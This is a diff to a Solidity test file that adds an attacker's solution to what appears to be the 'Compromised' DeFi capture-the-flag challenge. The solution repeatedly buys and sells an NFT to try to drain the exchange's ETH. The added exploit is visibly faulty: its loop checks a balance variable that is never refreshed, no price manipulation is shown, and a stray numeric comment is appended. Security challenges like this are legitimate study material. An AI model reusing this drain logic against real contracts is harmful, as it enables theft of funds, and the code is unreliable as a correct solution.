@@ -76,10 +76,21 @@ contract Compromised is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        uint privevalue = 0.1 ether;
+        vm.startPrank(attacker);
+        uint bal = address(exchange).balance;
+        for (uint i; bal != privevalue; i++) {
+            uint id = exchange.buyOne{value: privevalue}();
+            damnValuableNFT.approve(address(exchange), id);
+            exchange.sellOne(id);
+        }
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         validation();
     }
+
+    //999 000 000 000 000 000 000
 
     function validation() internal {
         // Exchange must have lost all ETH
